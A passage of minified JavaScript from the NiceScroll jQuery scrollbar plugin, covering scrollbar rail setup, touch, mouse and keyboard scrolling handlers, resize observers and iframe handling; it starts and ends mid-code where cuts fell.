i=t.target||t.srcElement||t||!1;i&&i.id!=e;)i=i.parentNode||!1;return!1!==i};var z={thin:1,medium:3,thick:5};this.getDocumentScrollOffset=function(){return{top:window.pageYOffset||document.documentElement.scrollTop,left:window.pageXOffset||document.documentElement.scrollLeft}},this.getOffset=function(){if(_.isfixed){var t=_.win.offset(),e=_.getDocumentScrollOffset();return t.top-=e.top,t.left-=e.left,t}var i=_.win.offset();if(!_.viewport)return i;var o=_.viewport.offset();return{top:i.top-o.top,left:i.left-o.left}},this.updateScrollBar=function(t){if(_.ishwscroll)_.rail.css({height:_.win.innerHeight()-(_.opt.railpadding.top+_.opt.railpadding.bottom)}),_.railh&&_.railh.css({width:_.win.innerWidth()-(_.opt.railpadding.left+_.opt.railpadding.right)});else{var e=_.getOffset();if((o={top:e.top,left:e.left-(_.opt.railpadding.left+_.opt.railpadding.right)}).top+=u(_.win,"border-top-width",!0),o.left+=_.rail.align?_.win.outerWidth()-u(_.win,"border-right-width")-_.rail.width:u(_.win,"border-left-width"),(i=_.opt.railoffset)&&(i.top&&(o.top+=i.top),i.left&&(o.left+=i.left)),_.railslocked||_.rail.css({top:o.top,left:o.left,height:(t?t.h:_.win.innerHeight())-(_.opt.railpadding.top+_.opt.railpadding.bottom)}),_.zoom&&_.zoom.css({top:o.top+1,left:1==_.rail.align?o.left-20:o.left+_.rail.width+4}),_.railh&&!_.railslocked){var i,o={top:e.top,left:e.left};(i=_.opt.railhoffset)&&(i.top&&(o.top+=i.top),i.left&&(o.left+=i.left));var n=_.railh.align?o.top+u(_.win,"border-top-width",!0)+_.win.innerHeight()-_.railh.height:o.top+u(_.win,"border-top-width",!0),s=o.left+u(_.win,"border-left-width");_.railh.css({top:n-(_.opt.railpadding.top+_.opt.railpadding.bottom),left:s,width:_.railh.width})}}},this.doRailClick=function(t,e,i){var o,n,s,r;_.railslocked||(_.cancelEvent(t),e?(o=i?_.doScrollLeft:_.doScrollTop)(s=i?(t.pageX-_.railh.offset().left-_.cursorwidth/2)*_.scrollratio.x:(t.pageY-_.rail.offset().top-_.cursorheight/2)*_.scrollratio.y):(o=i?_.doScrollLeftBy:_.doScrollBy,s=i?_.scroll.x:_.scroll.y,r=i?t.pageX-_.railh.offset().left:t.pageY-_.rail.offset().top,n=i?_.view.w:_.view.h,o(s>=r?n:-n)))},_.hasanimationframe=l,_.hascancelanimationframe=c,_.hasanimationframe?_.hascancelanimationframe||(c=function(){_.cancelAnimationFrame=!0}):(l=function(t){return setTimeout(t,15-Math.floor(+new Date/1e3)%16)},c=clearInterval),this.init=function(){if(_.saved.css=[],b.isie7mobile)return!0;if(b.isoperamini)return!0;if(b.hasmstouch&&_.css(_.ispage?r("html"):_.win,{"-ms-touch-action":"none"}),_.zindex="auto",_.ispage||"auto"!=_.opt.zindex?_.zindex=_.opt.zindex:_.zindex=function(){var t=_.win;if("zIndex"in t)return t.zIndex();for(;t.length>0;){if(9==t[0].nodeType)return!1;var e=t.css("zIndex");if(!isNaN(e)&&0!=e)return parseInt(e);t=t.parent()}return!1}()||"auto",_.ispage||"auto"==_.zindex||_.zindex>s&&(s=_.zindex),_.isie&&0==_.zindex&&"auto"==_.opt.zindex&&(_.zindex="auto"),!_.ispage||!b.cantouch&&!b.isieold&&!b.isie9mobile){var t=_.docscroll;_.ispage&&(t=_.haswrapper?_.win:_.doc),b.isie9mobile||_.css(t,{"overflow-y":"hidden"}),_.ispage&&b.isie7&&("BODY"==_.doc[0].nodeName?_.css(r("html"),{"overflow-y":"hidden"}):"HTML"==_.doc[0].nodeName&&_.css(r("body"),{"overflow-y":"hidden"})),!b.isios||_.ispage||_.haswrapper||_.css(r("body"),{"-webkit-overflow-scrolling":"touch"}),(h=r(document.createElement("div"))).css({position:"relative",top:0,float:"right",width:_.opt.cursorwidth,height:"0px","background-color":_.opt.cursorcolor,border:_.opt.cursorborder,"background-clip":"padding-box","-webkit-border-radius":_.opt.cursorborderradius,"-moz-border-radius":_.opt.cursorborderradius,"border-radius":_.opt.cursorborderradius}),h.hborder=parseFloat(h.outerHeight()-h.innerHeight()),h.addClass("nicescroll-cursors"),_.cursor=h;var n=r(document.createElement("div"));n.attr("id",_.id),n.addClass("nicescroll-rails nicescroll-rails-vr");var a,l,c=["left","right","top","bottom"];for(var p in c)l=c[p],(a=_.opt.railpadding[l])?n.css("padding-"+l,a+"px"):_.opt.railpadding[l]=0;n.append(h),n.width=Math.max(parseFloat(_.opt.cursorwidth),h.outerWidth()),n.css({width:n.width+"px",zIndex:_.zindex,background:_.opt.background,cursor:"default"}),n.visibility=!0,n.scrollable=!0,n.align="left"==_.opt.railalign?0:1,_.rail=n,_.rail.drag=!1;var u,h,f=!1;if(!_.opt.boxzoom||_.ispage||b.isieold||(f=document.createElement("div"),_.bind(f,"click",_.doZoom),_.bind(f,"mouseenter",(function(){_.zoom.css("opacity",_.opt.cursoropacitymax)})),_.bind(f,"mouseleave",(function(){_.zoom.css("opacity",_.opt.cursoropacitymin)})),_.zoom=r(f),_.zoom.css({cursor:"pointer","z-index":_.zindex,backgroundImage:"url("+_.opt.scriptpath+"zoomico.png)",height:18,width:18,backgroundPosition:"0px 0px"}),_.opt.dblclickzoom&&_.bind(_.win,"dblclick",_.doZoom),b.cantouch&&_.opt.gesturezoom&&(_.ongesturezoom=function(t){return t.scale>1.5&&_.doZoomIn(t),t.scale<.8&&_.doZoomOut(t),_.cancelEvent(t)},_.bind(_.win,"gestureend",_.ongesturezoom))),_.railh=!1,_.opt.horizrailenabled)_.css(t,{"overflow-x":"hidden"}),(h=r(document.createElement("div"))).css({position:"absolute",top:0,height:_.opt.cursorwidth,width:"0px","background-color":_.opt.cursorcolor,border:_.opt.cursorborder,"background-clip":"padding-box","-webkit-border-radius":_.opt.cursorborderradius,"-moz-border-radius":_.opt.cursorborderradius,"border-radius":_.opt.cursorborderradius}),b.isieold&&h.css({overflow:"hidden"}),h.wborder=parseFloat(h.outerWidth()-h.innerWidth()),h.addClass("nicescroll-cursors"),_.cursorh=h,(u=r(document.createElement("div"))).attr("id",_.id+"-hr"),u.addClass("nicescroll-rails nicescroll-rails-hr"),u.height=Math.max(parseFloat(_.opt.cursorwidth),h.outerHeight()),u.css({height:u.height+"px",zIndex:_.zindex,background:_.opt.background}),u.append(h),u.visibility=!0,u.scrollable=!0,u.align="top"==_.opt.railvalign?0:1,_.railh=u,_.railh.drag=!1;if(_.ispage)n.css({position:"fixed",top:"0px",height:"100%"}),n.align?n.css({right:"0px"}):n.css({left:"0px"}),_.body.append(n),_.railh&&(u.css({position:"fixed",left:"0px",width:"100%"}),u.align?u.css({bottom:"0px"}):u.css({top:"0px"}),_.body.append(u));else{if(_.ishwscroll){"static"==_.win.css("position")&&_.css(_.win,{position:"relative"});var m="HTML"==_.win[0].nodeName?_.body:_.win;r(m).scrollTop(0).scrollLeft(0),_.zoom&&(_.zoom.css({position:"absolute",top:1,right:0,"margin-right":n.width+4}),m.append(_.zoom)),n.css({position:"absolute",top:0}),n.align?n.css({right:0}):n.css({left:0}),m.append(n),u&&(u.css({position:"absolute",left:0,bottom:0}),u.align?u.css({bottom:0}):u.css({top:0}),m.append(u))}else{_.isfixed="fixed"==_.win.css("position");var g=_.isfixed?"fixed":"absolute";_.isfixed||(_.viewport=_.getViewport(_.win[0])),_.viewport&&(_.body=_.viewport,0==/fixed|absolute/.test(_.viewport.css("position"))&&_.css(_.viewport,{position:"relative"})),n.css({position:g}),_.zoom&&_.zoom.css({position:g}),_.updateScrollBar(),_.body.append(n),_.zoom&&_.body.append(_.zoom),_.railh&&(u.css({position:g}),_.body.append(u))}b.isios&&_.css(_.win,{"-webkit-tap-highlight-color":"rgba(0,0,0,0)","-webkit-touch-callout":"none"}),b.isie&&_.opt.disableoutline&&_.win.attr("hideFocus","true"),b.iswebkit&&_.opt.disableoutline&&_.win.css({outline:"none"})}if(!1===_.opt.autohidemode?(_.autohidedom=!1,_.rail.css({opacity:_.opt.cursoropacitymax}),_.railh&&_.railh.css({opacity:_.opt.cursoropacitymax})):!0===_.opt.autohidemode||"leave"===_.opt.autohidemode?(_.autohidedom=r().add(_.rail),b.isie8&&(_.autohidedom=_.autohidedom.add(_.cursor)),_.railh&&(_.autohidedom=_.autohidedom.add(_.railh)),_.railh&&b.isie8&&(_.autohidedom=_.autohidedom.add(_.cursorh))):"scroll"==_.opt.autohidemode?(_.autohidedom=r().add(_.rail),_.railh&&(_.autohidedom=_.autohidedom.add(_.railh))):"cursor"==_.opt.autohidemode?(_.autohidedom=r().add(_.cursor),_.railh&&(_.autohidedom=_.autohidedom.add(_.cursorh))):"hidden"==_.opt.autohidemode&&(_.autohidedom=!1,_.hide(),_.railslocked=!1),b.isie9mobile){_.scrollmom=new v(_),_.onmangotouch=function(){var t=_.getScrollTop(),e=_.getScrollLeft();if(t==_.scrollmom.lastscrolly&&e==_.scrollmom.lastscrollx)return!0;var i=t-_.mangotouch.sy,o=e-_.mangotouch.sx;if(0!=Math.round(Math.sqrt(Math.pow(o,2)+Math.pow(i,2)))){var n=0>i?-1:1,s=0>o?-1:1,r=+new Date;if(_.mangotouch.lazy&&clearTimeout(_.mangotouch.lazy),r-_.mangotouch.tm>80||_.mangotouch.dry!=n||_.mangotouch.drx!=s)_.scrollmom.stop(),_.scrollmom.reset(e,t),_.mangotouch.sy=t,_.mangotouch.ly=t,_.mangotouch.sx=e,_.mangotouch.lx=e,_.mangotouch.dry=n,_.mangotouch.drx=s,_.mangotouch.tm=r;else{_.scrollmom.stop(),_.scrollmom.update(_.mangotouch.sx-o,_.mangotouch.sy-i),_.mangotouch.tm=r;var a=Math.max(Math.abs(_.mangotouch.ly-t),Math.abs(_.mangotouch.lx-e));_.mangotouch.ly=t,_.mangotouch.lx=e,a>2&&(_.mangotouch.lazy=setTimeout((function(){_.mangotouch.lazy=!1,_.mangotouch.dry=0,_.mangotouch.drx=0,_.mangotouch.tm=0,_.scrollmom.doMomentum(30)}),100))}}};var y=_.getScrollTop(),w=_.getScrollLeft();_.mangotouch={sy:y,ly:y,dry:0,sx:w,lx:w,drx:0,lazy:!1,tm:0},_.bind(_.docscroll,"scroll",_.onmangotouch)}else{if(b.cantouch||_.istouchcapable||_.opt.touchbehavior||b.hasmstouch){_.scrollmom=new v(_),_.ontouchstart=function(t){if(t.pointerType&&2!=t.pointerType&&"touch"!=t.pointerType)return!1;if(_.hasmoving=!1,!_.railslocked){var e;if(b.hasmstouch)for(e=!!t.target&&t.target;e;){var i=r(e).getNiceScroll();if(i.length>0&&i[0].me==_.me)break;if(i.length>0)return!1;if("DIV"==e.nodeName&&e.id==_.id)break;e=!!e.parentNode&&e.parentNode}if(_.cancelScroll(),e=_.getTarget(t))if(/INPUT/i.test(e.nodeName)&&/range/i.test(e.type))return _.stopPropagation(t);if(!("clientX"in t)&&"changedTouches"in t&&(t.clientX=t.changedTouches[0].clientX,t.clientY=t.changedTouches[0].clientY),_.forcescreen){var o=t;(t={original:t.original?t.original:t}).clientX=o.screenX,t.clientY=o.screenY}if(_.rail.drag={x:t.clientX,y:t.clientY,sx:_.scroll.x,sy:_.scroll.y,st:_.getScrollTop(),sl:_.getScrollLeft(),pt:2,dl:!1},_.ispage||!_.opt.directionlockdeadzone)_.rail.drag.dl="f";else{var n={w:r(window).width(),h:r(window).height()},s={w:Math.max(document.body.scrollWidth,document.documentElement.scrollWidth),h:Math.max(document.body.scrollHeight,document.documentElement.scrollHeight)},a=Math.max(0,s.h-n.h),l=Math.max(0,s.w-n.w);!_.rail.scrollable&&_.railh.scrollable?_.rail.drag.ck=a>0&&"v":_.rail.scrollable&&!_.railh.scrollable?_.rail.drag.ck=l>0&&"h":_.rail.drag.ck=!1,_.rail.drag.ck||(_.rail.drag.dl="f")}if(_.opt.touchbehavior&&_.isiframe&&b.isie){var c=_.win.position();_.rail.drag.x+=c.left,_.rail.drag.y+=c.top}if(_.hasmoving=!1,_.lastmouseup=!1,_.scrollmom.reset(t.clientX,t.clientY),!b.cantouch&&!this.istouchcapable&&!t.pointerType){if(!(!!e&&/INPUT|SELECT|TEXTAREA/i.test(e.nodeName)))return!_.ispage&&b.hasmousecapture&&e.setCapture(),_.opt.touchbehavior?(e.onclick&&!e._onclick&&(e._onclick=e.onclick,e.onclick=function(t){return!_.hasmoving&&void e._onclick.call(this,t)}),_.cancelEvent(t)):_.stopPropagation(t);/SUBMIT|CANCEL|BUTTON/i.test(r(e).attr("type"))&&(pc={tg:e,click:!1},_.preventclick=pc)}}},_.ontouchend=function(t){if(!_.rail.drag)return!0;if(2==_.rail.drag.pt){if(t.pointerType&&2!=t.pointerType&&"touch"!=t.pointerType)return!1;if(_.scrollmom.doMomentum(),_.rail.drag=!1,_.hasmoving&&(_.lastmouseup=!0,_.hideCursor(),b.hasmousecapture&&document.releaseCapture(),!b.cantouch))return _.cancelEvent(t)}else if(1==_.rail.drag.pt)return _.onmouseup(t)};var x=_.opt.touchbehavior&&_.isiframe&&!b.hasmousecapture;_.ontouchmove=function(t,e){if(!_.rail.drag)return!1;if(t.targetTouches&&_.opt.preventmultitouchscrolling&&t.targetTouches.length>1)return!1;if(t.pointerType&&2!=t.pointerType&&"touch"!=t.pointerType)return!1;if(2==_.rail.drag.pt){if(b.cantouch&&b.isios&&void 0===t.original)return!0;var i,o;if(_.hasmoving=!0,_.preventclick&&!_.preventclick.click&&(_.preventclick.click=_.preventclick.tg.onclick||!1,_.preventclick.tg.onclick=_.onpreventclick),"changedTouches"in(t=r.extend({original:t},t))&&(t.clientX=t.changedTouches[0].clientX,t.clientY=t.changedTouches[0].clientY),_.forcescreen){var n=t;(t={original:t.original?t.original:t}).clientX=n.screenX,t.clientY=n.screenY}if(o=i=0,x&&!e){var s=_.win.position();o=-s.left,i=-s.top}var a,l=t.clientY+i,c=l-_.rail.drag.y,p=t.clientX+o,u=p-_.rail.drag.x,d=_.rail.drag.st-c;_.ishwscroll&&_.opt.bouncescroll?0>d?d=Math.round(d/2):d>_.page.maxh&&(d=_.page.maxh+Math.round((d-_.page.maxh)/2)):(0>d&&(d=0,l=0),d>_.page.maxh&&(d=_.page.maxh,l=0)),_.railh&&_.railh.scrollable&&(a=_.isrtlmode?u-_.rail.drag.sl:_.rail.drag.sl-u,_.ishwscroll&&_.opt.bouncescroll?0>a?a=Math.round(a/2):a>_.page.maxw&&(a=_.page.maxw+Math.round((a-_.page.maxw)/2)):(0>a&&(a=0,p=0),a>_.page.maxw&&(a=_.page.maxw,p=0)));var h=!1;if(_.rail.drag.dl)h=!0,"v"==_.rail.drag.dl?a=_.rail.drag.sl:"h"==_.rail.drag.dl&&(d=_.rail.drag.st);else{var f=Math.abs(c),m=Math.abs(u),g=_.opt.directionlockdeadzone;if("v"==_.rail.drag.ck){if(f>g&&.3*f>=m)return _.rail.drag=!1,!0;m>g&&(_.rail.drag.dl="f",r("body").scrollTop(r("body").scrollTop()))}else if("h"==_.rail.drag.ck){if(m>g&&.3*m>=f)return _.rail.drag=!1,!0;f>g&&(_.rail.drag.dl="f",r("body").scrollLeft(r("body").scrollLeft()))}}if(_.synched("touchmove",(function(){_.rail.drag&&2==_.rail.drag.pt&&(_.prepareTransition&&_.prepareTransition(0),_.rail.scrollable&&_.setScrollTop(d),_.scrollmom.update(p,l),_.railh&&_.railh.scrollable?(_.setScrollLeft(a),_.showCursor(d,a)):_.showCursor(d),b.isie10&&document.selection.clear())})),b.ischrome&&_.istouchcapable&&(h=!1),h)return _.cancelEvent(t)}else if(1==_.rail.drag.pt)return _.onmousemove(t)}}if(_.onmousedown=function(t,e){if(!_.rail.drag||1==_.rail.drag.pt){if(_.railslocked)return _.cancelEvent(t);_.cancelScroll(),_.rail.drag={x:t.clientX,y:t.clientY,sx:_.scroll.x,sy:_.scroll.y,pt:1,hr:!!e};var i=_.getTarget(t);return!_.ispage&&b.hasmousecapture&&i.setCapture(),_.isiframe&&!b.hasmousecapture&&(_.saved.csspointerevents=_.doc.css("pointer-events"),_.css(_.doc,{"pointer-events":"none"})),_.hasmoving=!1,_.cancelEvent(t)}},_.onmouseup=function(t){return _.rail.drag?1!=_.rail.drag.pt||(b.hasmousecapture&&document.releaseCapture(),_.isiframe&&!b.hasmousecapture&&_.doc.css("pointer-events",_.saved.csspointerevents),_.rail.drag=!1,_.hasmoving&&_.triggerScrollEnd(),_.cancelEvent(t)):void 0},_.onmousemove=function(t){if(_.rail.drag){if(1!=_.rail.drag.pt)return;if(b.ischrome&&0==t.which)return _.onmouseup(t);if(_.cursorfreezed=!0,_.hasmoving=!0,_.rail.drag.hr){_.scroll.x=_.rail.drag.sx+(t.clientX-_.rail.drag.x),_.scroll.x<0&&(_.scroll.x=0);var e=_.scrollvaluemaxw;_.scroll.x>e&&(_.scroll.x=e)}else{_.scroll.y=_.rail.drag.sy+(t.clientY-_.rail.drag.y),_.scroll.y<0&&(_.scroll.y=0);var i=_.scrollvaluemax;_.scroll.y>i&&(_.scroll.y=i)}return _.synched("mousemove",(function(){_.rail.drag&&1==_.rail.drag.pt&&(_.showCursor(),_.rail.drag.hr?_.hasreversehr?_.doScrollLeft(_.scrollvaluemaxw-Math.round(_.scroll.x*_.scrollratio.x),_.opt.cursordragspeed):_.doScrollLeft(Math.round(_.scroll.x*_.scrollratio.x),_.opt.cursordragspeed):_.doScrollTop(Math.round(_.scroll.y*_.scrollratio.y),_.opt.cursordragspeed))})),_.cancelEvent(t)}_.checkarea=0},b.cantouch||_.opt.touchbehavior)_.onpreventclick=function(t){return _.preventclick?(_.preventclick.tg.onclick=_.preventclick.click,_.preventclick=!1,_.cancelEvent(t)):void 0},_.bind(_.win,"mousedown",_.ontouchstart),_.onclick=!b.isios&&function(t){return!_.lastmouseup||(_.lastmouseup=!1,_.cancelEvent(t))},_.opt.grabcursorenabled&&b.cursorgrabvalue&&(_.css(_.ispage?_.doc:_.win,{cursor:b.cursorgrabvalue}),_.css(_.rail,{cursor:b.cursorgrabvalue}));else{var S=function(t){if(_.selectiondrag){if(t){var e=_.win.outerHeight(),i=t.pageY-_.selectiondrag.top;i>0&&e>i&&(i=0),i>=e&&(i-=e),_.selectiondrag.df=i}if(0!=_.selectiondrag.df){var o=2*-Math.floor(_.selectiondrag.df/6);_.doScrollBy(o),_.debounced("doselectionscroll",(function(){S()}),50)}}};"getSelection"in document?_.hasTextSelected=function(){return document.getSelection().rangeCount>0}:"selection"in document?_.hasTextSelected=function(){return"None"!=document.selection.type}:_.hasTextSelected=function(){return!1},_.onselectionstart=function(t){_.ispage||(_.selectiondrag=_.win.offset())},_.onselectionend=function(t){_.selectiondrag=!1},_.onselectiondrag=function(t){_.selectiondrag&&_.hasTextSelected()&&_.debounced("selectionscroll",(function(){S(t)}),250)}}b.hasw3ctouch?(_.css(_.rail,{"touch-action":"none"}),_.css(_.cursor,{"touch-action":"none"}),_.bind(_.win,"pointerdown",_.ontouchstart),_.bind(document,"pointerup",_.ontouchend),_.bind(document,"pointermove",_.ontouchmove)):b.hasmstouch?(_.css(_.rail,{"-ms-touch-action":"none"}),_.css(_.cursor,{"-ms-touch-action":"none"}),_.bind(_.win,"MSPointerDown",_.ontouchstart),_.bind(document,"MSPointerUp",_.ontouchend),_.bind(document,"MSPointerMove",_.ontouchmove),_.bind(_.cursor,"MSGestureHold",(function(t){t.preventDefault()})),_.bind(_.cursor,"contextmenu",(function(t){t.preventDefault()}))):this.istouchcapable&&(_.bind(_.win,"touchstart",_.ontouchstart),_.bind(document,"touchend",_.ontouchend),_.bind(document,"touchcancel",_.ontouchend),_.bind(document,"touchmove",_.ontouchmove)),(_.opt.cursordragontouch||!b.cantouch&&!_.opt.touchbehavior)&&(_.rail.css({cursor:"default"}),_.railh&&_.railh.css({cursor:"default"}),_.jqbind(_.rail,"mouseenter",(function(){return!(!_.ispage&&!_.win.is(":visible"))&&(_.canshowonmouseevent&&_.showCursor(),void(_.rail.active=!0))})),_.jqbind(_.rail,"mouseleave",(function(){_.rail.active=!1,_.rail.drag||_.hideCursor()})),_.opt.sensitiverail&&(_.bind(_.rail,"click",(function(t){_.doRailClick(t,!1,!1)})),_.bind(_.rail,"dblclick",(function(t){_.doRailClick(t,!0,!1)})),_.bind(_.cursor,"click",(function(t){_.cancelEvent(t)})),_.bind(_.cursor,"dblclick",(function(t){_.cancelEvent(t)}))),_.railh&&(_.jqbind(_.railh,"mouseenter",(function(){return!(!_.ispage&&!_.win.is(":visible"))&&(_.canshowonmouseevent&&_.showCursor(),void(_.rail.active=!0))})),_.jqbind(_.railh,"mouseleave",(function(){_.rail.active=!1,_.rail.drag||_.hideCursor()})),_.opt.sensitiverail&&(_.bind(_.railh,"click",(function(t){_.doRailClick(t,!1,!0)})),_.bind(_.railh,"dblclick",(function(t){_.doRailClick(t,!0,!0)})),_.bind(_.cursorh,"click",(function(t){_.cancelEvent(t)})),_.bind(_.cursorh,"dblclick",(function(t){_.cancelEvent(t)}))))),b.cantouch||_.opt.touchbehavior?(_.bind(b.hasmousecapture?_.win:document,"mouseup",_.ontouchend),_.bind(document,"mousemove",_.ontouchmove),_.onclick&&_.bind(document,"click",_.onclick),_.opt.cursordragontouch&&(_.bind(_.cursor,"mousedown",_.onmousedown),_.bind(_.cursor,"mouseup",_.onmouseup),_.cursorh&&_.bind(_.cursorh,"mousedown",(function(t){_.onmousedown(t,!0)})),_.cursorh&&_.bind(_.cursorh,"mouseup",_.onmouseup))):(_.bind(b.hasmousecapture?_.win:document,"mouseup",_.onmouseup),_.bind(document,"mousemove",_.onmousemove),_.onclick&&_.bind(document,"click",_.onclick),_.bind(_.cursor,"mousedown",_.onmousedown),_.bind(_.cursor,"mouseup",_.onmouseup),_.railh&&(_.bind(_.cursorh,"mousedown",(function(t){_.onmousedown(t,!0)})),_.bind(_.cursorh,"mouseup",_.onmouseup)),!_.ispage&&_.opt.enablescrollonselection&&(_.bind(_.win[0],"mousedown",_.onselectionstart),_.bind(document,"mouseup",_.onselectionend),_.bind(_.cursor,"mouseup",_.onselectionend),_.cursorh&&_.bind(_.cursorh,"mouseup",_.onselectionend),_.bind(document,"mousemove",_.onselectiondrag)),_.zoom&&(_.jqbind(_.zoom,"mouseenter",(function(){_.canshowonmouseevent&&_.showCursor(),_.rail.active=!0})),_.jqbind(_.zoom,"mouseleave",(function(){_.rail.active=!1,_.rail.drag||_.hideCursor()})))),_.opt.enablemousewheel&&(_.isiframe||_.bind(b.isie&&_.ispage?document:_.win,"mousewheel",_.onmousewheel),_.bind(_.rail,"mousewheel",_.onmousewheel),_.railh&&_.bind(_.railh,"mousewheel",_.onmousewheelhr)),_.ispage||b.cantouch||/HTML|^BODY/.test(_.win[0].nodeName)||(_.win.attr("tabindex")||_.win.attr({tabindex:o++}),_.jqbind(_.win,"focus",(function(t){e=_.getTarget(t).id||!0,_.hasfocus=!0,_.canshowonmouseevent&&_.noticeCursor()})),_.jqbind(_.win,"blur",(function(t){e=!1,_.hasfocus=!1})),_.jqbind(_.win,"mouseenter",(function(t){i=_.getTarget(t).id||!0,_.hasmousefocus=!0,_.canshowonmouseevent&&_.noticeCursor()})),_.jqbind(_.win,"mouseleave",(function(){i=!1,_.hasmousefocus=!1,_.rail.drag||_.hideCursor()})))}if(_.onkeypress=function(t){if(_.railslocked&&0==_.page.maxh)return!0;t=t||window.e;var o=_.getTarget(t);if(o&&/INPUT|TEXTAREA|SELECT|OPTION/.test(o.nodeName)&&(!(o.getAttribute("type")||o.type||!1)||!/submit|button|cancel/i.tp))return!0;if(r(o).attr("contenteditable"))return!0;if(_.hasfocus||_.hasmousefocus&&!e||_.ispage&&!e&&!i){var n=t.keyCode;if(_.railslocked&&27!=n)return _.cancelEvent(t);var s=t.ctrlKey||!1,a=t.shiftKey||!1,l=!1;switch(n){case 38:case 63233:_.doScrollBy(72),l=!0;break;case 40:case 63235:_.doScrollBy(-72),l=!0;break;case 37:case 63232:_.railh&&(s?_.doScrollLeft(0):_.doScrollLeftBy(72),l=!0);break;case 39:case 63234:_.railh&&(s?_.doScrollLeft(_.page.maxw):_.doScrollLeftBy(-72),l=!0);break;case 33:case 63276:_.doScrollBy(_.view.h),l=!0;break;case 34:case 63277:_.doScrollBy(-_.view.h),l=!0;break;case 36:case 63273:_.railh&&s?_.doScrollPos(0,0):_.doScrollTo(0),l=!0;break;case 35:case 63275:_.railh&&s?_.doScrollPos(_.page.maxw,_.page.maxh):_.doScrollTo(_.page.maxh),l=!0;break;case 32:_.opt.spacebarenabled&&(a?_.doScrollBy(_.view.h):_.doScrollBy(-_.view.h),l=!0);break;case 27:_.zoomactive&&(_.doZoom(),l=!0)}if(l)return _.cancelEvent(t)}},_.opt.enablekeyboard&&_.bind(document,b.isopera&&!b.isopera12?"keypress":"keydown",_.onkeypress),_.bind(document,"keydown",(function(t){(t.ctrlKey||!1)&&(_.wheelprevented=!0)})),_.bind(document,"keyup",(function(t){t.ctrlKey||!1||(_.wheelprevented=!1)})),_.bind(window,"blur",(function(t){_.wheelprevented=!1})),_.bind(window,"resize",_.lazyResize),_.bind(window,"orientationchange",_.lazyResize),_.bind(window,"load",_.lazyResize),b.ischrome&&!_.ispage&&!_.haswrapper){var z=_.win.attr("style"),T=parseFloat(_.win.css("width"))+1;_.win.css("width",T),_.synched("chromefix",(function(){_.win.attr("style",z)}))}_.onAttributeChange=function(t){_.lazyResize(_.isieold?250:30)},!1!==d&&(_.observerbody=new d((function(t){return t.forEach((function(t){return"attributes"==t.type?r("body").hasClass("modal-open")&&!r.contains(r(".modal-dialog")[0],_.doc[0])?_.hide():_.show():void 0})),document.body.scrollHeight!=_.page.maxh?_.lazyResize(30):void 0})),_.observerbody.observe(document.body,{childList:!0,subtree:!0,characterData:!1,attributes:!0,attributeFilter:["class"]})),_.ispage||_.haswrapper||(!1!==d?(_.observer=new d((function(t){t.forEach(_.onAttributeChange)})),_.observer.observe(_.win[0],{childList:!0,characterData:!1,attributes:!0,subtree:!1}),_.observerremover=new d((function(t){t.forEach((function(t){if(t.removedNodes.length>0)for(var e in t.removedNodes)if(_&&t.removedNodes[e]==_.win[0])return _.remove()}))})),_.observerremover.observe(_.win[0].parentNode,{childList:!0,characterData:!1,attributes:!1,subtree:!1})):(_.bind(_.win,b.isie&&!b.isie9?"propertychange":"DOMAttrModified",_.onAttributeChange),b.isie9&&_.win[0].attachEvent("onpropertychange",_.onAttributeChange),_.bind(_.win,"DOMNodeRemoved",(function(t){t.target==_.win[0]&&_.remove()})))),!_.ispage&&_.opt.boxzoom&&_.bind(window,"resize",_.resizeZoom),_.istextarea&&(_.bind(_.win,"keydown",_.lazyResize),_.bind(_.win,"mouseup",_.lazyResize)),_.lazyResize(30)}if("IFRAME"==this.doc[0].nodeName){var k=function(){var t;_.iframexd=!1;try{(t="contentDocument"in this?this.contentDocument:this.contentWindow.document).domain}catch(e){_.iframexd=!0,t=!1}if(_.iframexd)return"console"in window&&console.log("NiceScroll error: policy restriced iframe"),!0;if(_.forcescreen=!0,_.isiframe&&(_.iframe={doc:r(t),html:_.doc.contents().find("html")[0],body:_.doc.contents().find("body")[0]},_.getContentSize=function(){return{w:Math.max(_.iframe.html.scrollWidth,_.iframe.body.scrollWidth),h:Math.max(_.iframe.html.scrollHeight,_.iframe.body.scrollHeight)}},_.docscroll=r(_.iframe.body)),!b.isios&&_.opt.iframeautoresize&&!_.isiframe){_.win.scrollTop(0),_.doc.height("");var e=Math.max(t.getElementsByTagName("html")[0].scrollHeight,t.body.scrollHeight);_.doc.height(e)}_.lazyResize(30),b.isie7&&_.css(r(_.iframe.html),{"overflow-y":"hidden"}),_.css(r(_.iframe.body),{"overflow-y":"hidden"}),b.isios&&_.haswrapper&&_.css(r(t.body),{"-webkit-transform":"translate3d(0,0,0)"}),"contentWindow"in this?_.bind(this.contentWindow,"scroll",_.onscroll):_.bind(t,"scroll",_.onscroll),_.opt.enablemousewheel&&_.bind(t,"mousewheel",_.onmousewheel),_.opt.enablekeyboard&&_.bind(t,b.isopera?"keypress":"keydown",_.onkeypress),(b.cantouch||_.opt.touchbehavior)&&(_.bind(t,"mousedown",_.ontouchstart),_.bind(t,"mousemove",(function(t){return _.ontouchmove(t,!0)})),_.opt.grabcursorenabled&&b.cursorgrabvalue&&_.css(r(t.body),{cursor:b.cursorgrabvalue})),_.bind(t,"mouseup",_.ontouchend),_.zoom&&(_.opt.dblclickzoom&&_.bind(t,"dblclick",_.doZoom),_.ongesturezoom&&_.bind(t,"gestureend",_.ongesturezoom))};this.doc[0].readyState&&"complete"==this.doc[0].readyState&&setTimeout((function(){k.call(_.doc[0],!1)}),500),_.bind(this.doc,"load",k)}},this.showCursor=function(t,e){if(_.cursortimeout&&(clearTimeout(_.cursortimeout),_.cursortimeout=0),_.rail){if(_.autohidedom&&(_.autohidedom.stop().css({opacity:_.opt.cursoropacitymax}),_.cursoractive=!0),_.rail.drag&&1==_.rail.drag.pt||(void 0!==t&&!1!==t&&(_.scroll.y=Math.round(1*t/_.scrollratio.y)),void 0!==e&&(_.scroll.x=Math.round(1*e/_.scrollratio.x))),_.cursor.css({height:_.cursorheight,top:_.scroll.y}),_.cursorh){var 